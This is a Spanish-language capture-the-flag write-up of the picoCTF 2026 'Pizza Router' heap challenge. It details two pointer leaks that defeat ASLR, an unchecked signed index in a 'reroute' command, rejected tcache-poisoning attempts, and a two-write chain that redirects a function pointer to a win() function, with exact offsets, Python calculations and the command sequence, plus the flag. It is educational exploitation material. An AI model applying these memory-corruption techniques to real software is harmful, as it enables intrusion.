---
title: Pizza Router
permalink: /writeups/pizza-router/
excerpt: Writeup del reto 'Pizza Router' (picoCTF 2026, categoria Binary Exploitation, dificultad Hard, por Palash Oswal).
date: 2026-09-11
categories:
- picoCTF 2026
- Binary Exploitation
tags:
- picoCTF-2026
- Hard
- Binary-Exploitation
layout: writeup
techniques:
- picoCTF 2026
- Hard
- Binary Exploitation
platform: picoCTF
status: Completado
---

Writeup del reto "Pizza Router" (picoCTF 2026, categoria Binary Exploitation, dificultad Hard, por Palash Oswal).

Servicio de "rutas de drones de pizza" sobre una rejilla, con comandos load/add_order/coupon/reroute/dispatch/replay/receipt. El binario (ELF PIE x86-64, Full RELRO, canary activo, no stripped) planifica caminos con un algoritmo tipo Dijkstra sobre mapas ASCII. La vulnerabilidad real es una escritura fuera de limites en el comando "reroute" sobre un buffer de heap; el reto completo requiere encadenar dos escrituras para lograr control total de un puntero de funcion de 8 bytes sin conocer de antemano la direccion base del binario mas alla de un leak generado por el propio programa.

Servidor: nc mysterious-sea.picoctf.net <puerto> (el puerto cambia por instancia; en la sesion resuelta fue 60445)  
Binario: proporcionado por el reto, sin codigo fuente. Mapas: city1.map, city2.map, city3.map.

Flag obtenida:  
flag{thirty_minutes_or_flag_free_63b00262}

Este documento reune las tecnicas y comandos exactos para reproducirlo a mano, incluyendo los callejones sin salida descartados con calculos y pruebas reales (no solo el camino que funciono), porque entender por que fallan los atajos obvios es parte central de resolver este reto.

> **Flag:** `flag{thirty_minutes_or_flag_free_63b00262}`

## 1. Reconocimiento del binario y proteccion activas

Comandos iniciales sobre el binario descargado:

```text
chmod +x router
file router
readelf -h router
readelf -l router | grep -E "GNU_RELRO|GNU_STACK|LOAD"
readelf -d router | grep -E "BIND_NOW|FLAGS"
nm -S --size-sort router
```

Resultado relevante:  
- ELF 64-bit PIE, dinamicamente enlazado, NO stripped (simbolos visibles, incluida una funcion "win").  
- GNU_RELRO presente + BIND_NOW en el dynamic section -> Full RELRO (la GOT es de solo lectura tras el arranque, descarta sobrescribir la GOT como vector).  
- Import de "__stack_chk_fail" -> canary de pila activo.  
- Simbolos clave localizados con nm:

```text
0000000000001340 T main            (3632 bytes -- TODA la logica de comandos vive en una sola funcion gigante)
0000000000002280 t load_map        (471 bytes)
0000000000002460 t win             (204 bytes)   <-- objetivo: abre y muestra flag.txt
0000000000002260 t fx_draw_basic   (16 bytes)    <-- solo hace puts("* beep *")
0000000000002270 t fx_finish_dummy (16 bytes)    <-- solo hace puts("Order delivered.")
0000000000005060 b ORD_N           (contador de ordenes, 4 bytes)
0000000000005080 b ORD             (array estatico de ordenes, 0x20700 bytes = 32 ordenes x 0x1038 bytes cada una)
0000000000025780 b G               (datos del mapa cargado)
```

Verificacion de "win" con objdump -d -M intel --start-address=0x2460 --stop-address=0x24e4: abre "flag.txt" con open(), lee su contenido y lo imprime con puts() tras un banner "*** 30 minutes or FLAG free! ***". Ninguna parte del programa llama normalmente a "win" -- hay que redirigir la ejecucion hacia ahi a mano.

## 2. Exploracion de la interfaz y localizacion del bug

Conexion de prueba y listado de comandos:

```text
nc mysterious-sea.picoctf.net <puerto>
help
```

Comandos disponibles: load <map>, maps, add_order <x> <y>, coupon <id> <amt>, reroute <id> <heap_idx> <new_cost>, dispatch <id>, replay <id>, receipt <id>, help, quit.

Secuencia basica de reconocimiento:

```text
load city1
add_order 1 1
dispatch 0
replay 0
receipt 0
```

"dispatch" anima el recorrido (imprime "* beep *" por cada salto y "Order delivered." al final). "replay" y "receipt" imprimen datos internos del pedido, incluidos DOS PUNTEROS crudos:

```text
replay: 8 points; renderer=0x58968863a260
receipt: hops=8 coupon=0 total=8 hint=0x5896a6f95b20
```

Analisis por disassembly (objdump -d -M intel router) de los manejadores de "reroute", "dispatch", "replay" y "receipt" (ubicados dentro de la gran funcion main, localizables buscando las cadenas "reroute"/"dispatch"/"replay"/"receipt" en .rodata con "strings -a -t x router" y luego sus xrefs "lea rsi,[rip+...]" seguidas de "call strcmp@plt"):

- Cada orden ocupa 0x1038 bytes en el array ORD, con campos: id(+0x0), x(+0x4), y(+0x8), coupon(+0xc), used-flag(+0x10), puntos de ruta inline, hops(+0x1018), copia de la direccion de fx_draw_basic dejada por dispatch(+0x1020), puntero al buffer de heap "pathptr"(+0x1028, duplicado en +0x1030).  
- "add_order" reserva con calloc(1088,1) un buffer de 0x440 bytes ("pathptr") que contiene: capacidad=0x80 en +0x0, puntero al propio array de heap en +0x8, puntero a +0x420 en +0x10, el array de "open list" de Dijkstra desde +0x18 (128 entradas de 8 bytes), y en la cola: magic "neon" en +0x420, reservado en +0x428, puntero a fx_finish_dummy en +0x430, puntero a fx_draw_basic en +0x438.  
- El bug: "reroute <id> <heap_idx> <new_cost>" escribe en pathptr+0x18+heap_idx*8 SIN validar que heap_idx este entre 0 y 127. heap_idx se interpreta con signo (movsxd), asi que valores negativos o mayores a 127 alcanzan cualquier posicion del mismo buffer -- incluidos los punteros a funcion de la cola.

## 3. Los dos leaks que rompen el ASLR

Disassembly de "dispatch" (tras terminar el recorrido) muestra:

```text
lea rcx,[rip+...]        # direccion de fx_draw_basic
mov QWORD PTR [ORD+idx*0x1038+0x1020], rcx
```

Es decir, cada "dispatch" dijea la direccion REAL de fx_draw_basic (codigo, dependiente de PIE) en el propio struct de la orden. El manejador de "replay" imprime EXACTAMENTE ese campo con el formato "renderer=%p":

```text
dispatch 0
replay 0
-> replay: 8 points; renderer=0x<direccion_de_fx_draw_basic>
```

Con esto:

```text
PIE_base = renderer_leak - 0x2260
win_addr = PIE_base + 0x2460   (win esta a +0x200 de fx_draw_basic)
```

El manejador de "receipt" imprime por separado el campo +0x1030 de la orden (copia del puntero pathptr) con el formato "hint=%p":

```text
receipt 0
-> receipt: hops=8 coupon=0 total=8 hint=0x<direccion_del_buffer_pathptr>
```

Con ambos leaks se conocen, para la MISMA conexion, tanto la base del binario (PIE) como la direccion exacta del buffer de heap que se va a corromper -- sin depredencia de ningun libc filtrado.

## 4. Callejon sin salida 1 -- forjar el puntero directamente (descartado con matematicas)

Intento directo: usar "reroute 0 132 <new_cost>" para escribir los 8 bytes del puntero fx_draw_basic (en pathptr+0x438) de una sola vez con el valor de win_addr.

Disassembly exacto de la escritura (direccion 0x1fdd-0x1fed del binario):

```text
mov edx, DWORD PTR [rbx+0x8]      ; edx = y de la orden
imul edx, DWORD PTR [G]            ; edx *= ancho del mapa
add edx, DWORD PTR [rbx+0x4]       ; edx += x de la orden      -> edx = y*ancho+x
mov DWORD PTR [rcx+0x4], eax        ; [target+4] (mitad ALTA) = new_cost  (LIBRE, cualquier valor)
mov DWORD PTR [rcx], edx            ; [target]   (mitad BAJA) = y*ancho+x (ACOTADO, 0-207 en un mapa 16x13)
```

Es decir, cada llamada a reroute escribe un valor de 8 bytes partido en dos mitades: la mitad BAJA es siempre el "indice de celda" de la orden (0 a ancho*alto-1, en estos mapas maximo 207), y la mitad ALTA es libre. Verificacion con Python usando valores reales filtrados en varias conexiones (heap y PIE con ASLR real, no en gdb):

```text
KEY = ...  # no aplica aqui, es solo el analisis directo
low32_necesario = (win_addr ^ 0) & 0xffffffff   # la mitad baja de win_addr NO esta en [0,207]
```

La mitad baja de una direccion real (heap o PIE) es esencialmente aleatoria de 32 bits; nunca cae en el rango 0-207. CONCLUSION: forjar el puntero completo en una sola llamada a reroute es matematicamente imposible sobre CUALQUIER direccion objetivo, sin importar cual se elija.

## 5. Callejon sin salida 2 -- envenenar el tcache (descartado empiricamente con gdb)

Hipotesis: ya que "reroute" puede escribir hacia atras (heap_idx negativo) sobre otras zonas del heap, se probo corromper el puntero "next" de un chunk ya liberado en el bin tcache correspondiente (los buffers temporales de Dijkstra, calloc(208,4) y malloc(832), se liberan dentro del propio "add_order").

Verificacion con un hook de malloc/calloc/free (LD_PRELOAD) compilado a mano:

```text
gcc -shared -fPIC -O0 -o hook.so hook.c -ldl
LD_PRELOAD=./hook.so ./router   (dentro de un pequeno driver en Python que envia los comandos)
```

Confirmado con direcciones reales: los dos buffers temporales quedan libres a exactamente pathptr-0x350 y pathptr-0x6a0 (tamano de chunk 0x350 para una peticion de 832 bytes). Con gdb (una vez instalado, "sudo apt-get install -y gdb") se leyeron los bytes crudos del chunk libre y se confirmo el mecanismo de "safe-linking" de glibc (next cifrado con XOR contra la propia direccion del chunk >> 12):

```text
x/8gx <direccion_del_chunk_libre>
```

Aun rompiendo ese cifrado con la formula conocida (target = stored_value XOR (direccion_victima>>12)), la escritura de reroute sigue partiendo el valor en {mitad baja acotada 0-207, mitad alta libre} -- el "target" resultante siempre cae en una direccion sin relacion con nada util (verificado con numeros reales de dos conexiones distintas). CONCLUSION: el envenenamiento de tcache con este primitivo tampoco permite elegir una direccion objetivo util; el problema no es el cifrado, es la limitacion intrinseca de la escritura misma.

## 6. El hallazgo clave -- reroute relee x/y en caliente

Relectura cuidadosa del disassembly de "reroute" (nodo 4): los valores "x" e "y" usados para calcular la mitad baja NO se copian ni se cachean en ningun sitio -- se leen DIRECTAMENTE de los campos ORD[id]+0x4 (x) y ORD[id]+0x8 (y) en el momento de CADA llamada a reroute, sin volver a validar los limites del mapa (esa validacion solo ocurre una vez, dentro de "add_order").

Esto implica: si se corrompe el campo "x" de una orden (con OTRA llamada a reroute, dirigida directamente al inicio del struct de la orden en vez de al buffer pathptr), la SIGUIENTE llamada a reroute sobre esa misma orden calculara su "mitad baja" a partir de ese valor ya corrompido -- que puede ser arbitrario, porque el campo x cae exactamente en la mitad "libre" (arbitraria) de una escritura.

Direcciones relevantes de la orden (ORD_addr = PIE_base + 0x5080 para la primera orden):

```text
ORD[0]+0x0  id      (mitad BAJA de una escritura -- acotada)
ORD[0]+0x4  x        (mitad ALTA de la MISMA escritura -- LIBRE)
ORD[0]+0x8  y        (mitad baja de la SIGUIENTE escritura -- acotada, pero ya no importa)
```

Con esto se puede construir un valor de 8 bytes COMPLETAMENTE arbitrario en dos pasos:

PASO 1 -- corromper x (y de paso el id, efecto colateral aceptado):

```text
heap_idx1 = (ORD_addr - pathptr_addr - 0x18) / 8
new_cost1 = (bajo_32_bits_deseado - y_actual*ancho_del_mapa)   [aritmetica mod 2^32]

reroute 0 <heap_idx1> <new_cost1>
```

Tras esta llamada, ORD[0].x = new_cost1, y ORD[0].id pasa a valer (y_actual*ancho + x_original) -- en la sesion resuelta, con x=1,y=1 y ancho=16, el id nuevo es 17. A partir de aqui hay que referirse a la orden por su NUEVO id (17), porque reroute/dispatch buscan por coincidencia exacta del campo id, no por indice de array.

PASO 2 -- escribir el valor final en el puntero de funcion objetivo (pathptr+0x438 = fx_draw_basic):

```text
heap_idx2 = (pathptr_addr + 0x438 - pathptr_addr - 0x18) / 8   =  0x420/8 = 132
new_cost2 = bits_altos_de_win_addr

reroute 17 132 <new_cost2>
```

Como ahora "x" vale new_cost1 (nuestro valor elegido) y "y" no cambio, la mitad baja de ESTA segunda escritura = y_actual*ancho + new_cost1 = exactamente el bajo_32_bits_deseado (por construccion), y la mitad alta = new_cost2 (libre, elegido para ser los bits altos de win_addr). El resultado en pathptr+0x438 es win_addr COMPLETO, byte a byte.

## 7. Validacion local antes de tocar el servidor remoto

El binario llama alarm(180) al arrancar -- cada conexion remota se autodestruye a los 3 minutos, asi que toda la cadena se probo primero contra una copia local:

```text
mkdir -p pizza/maps
cp city1.map city2.map city3.map pizza/maps/
echo "academy{test_local_flag}" > pizza/flag.txt
cp router pizza/
cd pizza && ./router     (o dentro de un driver Python con subprocess.Popen y pipes)
```

Calculo y verificacion de la formula completa en Python antes de ejecutarla:

```text
def u32(v): return v & 0xFFFFFFFF
def to_signed32(v):
    v = u32(v)
    return v - (1<<32) if v & 0x80000000 else v

heap_idx1 = (ORD_addr - pathptr - 0x18) // 8
new_cost1 = to_signed32(u32(win_addr) - y_current*width)
new_id    = u32(y_current*width + 1)

T = pathptr + 0x438
heap_idx2 = (T - pathptr - 0x18) // 8         # = 132
new_cost2 = to_signed32(win_addr >> 32)

edx_final = u32(y_current*width + u32(new_cost1))
valor_final = edx_final | (u32(new_cost2) << 32)
assert valor_final == win_addr    # comprobado: coincide exactamente
```

Ejecucion local completa (driver con subprocess + pipes):

```text
load city1
add_order 1 1
dispatch 0
replay 0        # leak PIE
receipt 0       # leak heap
reroute 0 <heap_idx1> <new_cost1>
reroute 17 <heap_idx2> <new_cost2>
dispatch 17     # ahora llama a win() en cada salto de la ruta
```

Resultado local: "win()" se ejecuto 7 veces (una por cada salto del camino de 8 puntos), imprimiendo el banner "*** 30 minutes or FLAG free! ***" seguido del contenido de flag.txt en cada una. Cadena confirmada al 100% antes de gastar el temporizador remoto.

## 8. Ejecucion final contra el servidor remoto y flag

Con la cadena ya validada localmente, se conecto una sola vez al servidor real y se envio la secuencia completa por socket (sin intervencion manual entre pasos, todo calculado automaticamente a partir de los dos leaks obtenidos EN VIVO de esa conexion):

```text
nc mysterious-sea.picoctf.net <puerto>

load city1
add_order 1 1
dispatch 0
replay 0
receipt 0
reroute 0 <heap_idx1_calculado> <new_cost1_calculado>
reroute 17 132 <new_cost2_calculado>
dispatch 17
```

Salida real obtenida:

```text
[34mdispatching...[0m
*** 30 minutes or FLAG free! ***
flag{thirty_minutes_or_flag_free_63b00262}
... (repetido 7 veces, una por salto) ...
Order delivered.
```

FLAG: flag{thirty_minutes_or_flag_free_63b00262}

Todo el intercambio, desde la conexion hasta la flag, se completo en menos de 60 segundos -- muy por debajo del limite de alarm(180) del binario.
